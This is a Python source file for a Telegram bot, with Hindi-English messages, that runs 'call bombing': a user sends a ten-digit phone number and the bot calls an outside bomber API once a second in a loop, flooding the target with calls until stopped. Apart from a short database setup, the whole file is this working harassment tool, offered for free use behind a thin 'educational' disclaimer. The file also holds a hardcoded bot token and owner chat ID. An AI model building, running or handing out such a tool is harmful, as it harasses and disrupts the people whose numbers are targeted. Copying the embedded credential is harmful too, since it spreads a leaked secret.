import asyncio
import aiohttp
import sqlite3
import os
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# Bot Configuration
TOKEN = "9236973341:AAHsDn5OQ_fyq1gMLGjiUoC07ZXrHknrb_s"
OWNER_CHAT_ID = 6684734209

# API
CALL_BOMBR_API = "https://fast-bomber-chodachodi.vercel.app/?mobile={mobile}"

# Database setup
def init_db():
    if os.path.exists('bot.db'):
        os.remove('bot.db')
    
    conn = sqlite3.connect('bot.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            join_date TEXT,
            is_blocked INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            id INTEGER PRIMARY KEY,
            maintenance_mode INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('INSERT OR IGNORE INTO settings (id, maintenance_mode) VALUES (1, 0)')
    
    conn.commit()
    conn.close()
    print("✅ Database initialized successfully!")

def get_user(user_id):
    conn = sqlite3.connect('bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    conn.close()
    return user

def add_user(user_id):
    conn = sqlite3.connect('bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    if not cursor.fetchone():
        cursor.execute(
            'INSERT INTO users (user_id, join_date, is_blocked) VALUES (?, ?, ?)',
            (user_id, datetime.now().isoformat(), 0)
        )
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users')
    users = cursor.fetchall()
    conn.close()
    return users

def get_settings():
    conn = sqlite3.connect('bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM settings WHERE id = 1')
    settings = cursor.fetchone()
    conn.close()
    return settings

# Dictionary to track running tasks
running_tasks = {}

# Start command with long welcome message
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    add_user(user_id)
    
    welcome_message = (
        "🔥 **WELCOME TO THE ULTIMATE SPEED BOMBING BOT** 🔥\n\n"
        "⚡ Yeh bot high-performance fast API par kaam karta hai jo target par non-stop requests bhej sakta hai.\n\n"
        "🎯 **Available Features:**\n"
        "• 📞 **Fast Call Bombing:** Target number par instant continuous calls.\n"
        "• 🛑 **Easy Control:** Kabhi bhi bombing rokne ke liye bas `stop` command bhejein ya Stop button dabayein.\n"
        "• 🚀 **Zero Restrictions:** Koi referral nahi, koi coin system nahi, bilkul free aur direct access!\n\n"
        "👇 **Kaise Use Karein?**\n"
        "Bas apna target phone number yahan type karke bhej dein (jaise: `9876543210`), aur bombing shuru ho jayegi!\n\n"
        "⚠️ *Disclaimer: Yeh bot sirf educational aur testing purposes ke liye banaya gaya hai.*"
    )
    
    keyboard = [
        [InlineKeyboardButton("📞 Start Bombing", callback_data="start_bomb_menu")],
        [InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')

# Main Menu from query
async def show_main_menu_from_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    welcome_message = (
        "🔥 **ULTIMATE SPEED BOMBING BOT MENU** 🔥\n\n"
        "🎯 Target par bombing shuru karne ke liye apna 10-digit ka mobile number bhejhein.\n"
        "🛑 Bombing rokne ke liye **stop** likhkar bhejein."
    )
    keyboard = [
        [InlineKeyboardButton("📞 How to Use", callback_data="help_info")],
        [InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')

# Help info callback
async def help_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📖 **GUIDE:**\n\n"
        "1. Direct apna 10 digit mobile number chat me bhejein.\n"
        "2. Bombing start ho jayegi.\n"
        "3. Beech me rokne ke liye `stop` command ka use karein.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])
    )

# Message handler for targets and stop command
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message_text = update.message.text.strip()
    
    # Check stop command via text
    if message_text.lower() == 'stop':
        task = running_tasks.pop(user_id, None)
        if task:
            task.cancel()
            await update.message.reply_text("🛑 **BOMBING SUCCESSFULLY STOPPED!** 🛑")
        else:
            await update.message.reply_text("⚠️ Koi active bombing nahi chal rahi hai.")
        return

    # Check if input is a valid mobile number (10 digits)
    if message_text.isdigit() and len(message_text) == 10:
        if user_id in running_tasks:
            await update.message.reply_text("⚠️ Pehle se ek bombing chal rahi hai! Use rokne ke liye **stop** bhejein.")
            return
            
        phone = message_text
        processing_msg = await update.message.reply_text(
            f"🚀 **BOMBING STARTED** 🚀\n\n"
            f"🎯 Target: `{phone}`\n"
            f"⚡ Status: Running...\n\n"
            f"🛑 Rokne ke liye **stop** bhejein ya niche button dabayein.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
        )
        
        # Start background task
        task = asyncio.create_task(send_bomb_requests(update, phone, user_id, processing_msg))
        running_tasks[user_id] = task
    else:
        await update.message.reply_text("❌ Kripya sahi 10-digit ka mobile number bhejein ya command use karein.")

# Background Bomb Request Worker
async def send_bomb_requests(update: Update, phone: str, user_id: int, processing_msg):
    successful = 0
    start_time = datetime.now()
    
    async with aiohttp.ClientSession() as session:
        while user_id in running_tasks:
            try:
                async with session.get(CALL_BOMBR_API.format(mobile=phone)) as response:
                    await response.text()
                successful += 1
                
                elapsed = int((datetime.now() - start_time).total_seconds())
                
                # Update status every 15 seconds
                if elapsed > 0 and elapsed % 15 == 0:
                    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
                    try:
                        await update.message.reply_text(
                            f"📊 **BOMBING STATUS UPDATE** 📊\n\n"
                            f"📞 Target: `{phone}`\n"
                            f"⏰ Active Time: {elapsed}s\n"
                            f"✅ Requests Sent: {successful}\n"
                            f"🚀 Status: Ongoing...",
                            reply_markup=keyboard
                        )
                    except:
                        pass
            except Exception:
                pass
                
            await asyncio.sleep(1)
            
    final_end_time = datetime.now()
    total_duration = int((final_end_time - start_time).total_seconds())
    
    try:
        await update.message.reply_text(
            f"🏁 **BOMBING FINISHED / STOPPED** 🏁\n\n"
            f"📞 Target: `{phone}`\n"
            f"⏱️ Total Duration: {total_duration} seconds\n"
            f"✅ Total Requests Sent: {successful}"
        )
    except:
        pass

# Stop callback handler
async def stop_bomb_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    
    if data.startswith('stop_bomb_'):
        try:
            target_user_id = int(data.split('_')[2])
            if user_id == target_user_id or user_id == OWNER_CHAT_ID:
                task = running_tasks.pop(target_user_id, None)
                if task:
                    task.cancel()
                    await query.answer("🛑 Bombing Stopped Successfully!", show_alert=True)
                    await query.edit_message_text("🛑 **BOMBING STOPPED BY USER!** 🛑")
                else:
                    await query.answer("⚠️ No active bombing found.", show_alert=True)
            else:
                await query.answer("❌ Aap isse nahi rok sakte!", show_alert=True)
        except Exception:
            await query.answer("❌ Error stopping bombing!", show_alert=True)

# Callback query router
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.data.startswith('stop_bomb_'):
        await stop_bomb_callback(update, context)
        return
        
    await query.answer()
    if query.data == "start_bomb_menu":
        await query.edit_message_text("📞 **Target Number Bhejein:**\n\nKripya seedha 10 digit ka mobile number type karke send karein.")
    elif query.data == "help_info":
        await help_info(update, context)
    elif query.data == "main_menu":
        await show_main_menu_from_query(update, context)

# Main execution loop
def main():
    init_db()
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🎯 Clean Speed Bombing Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
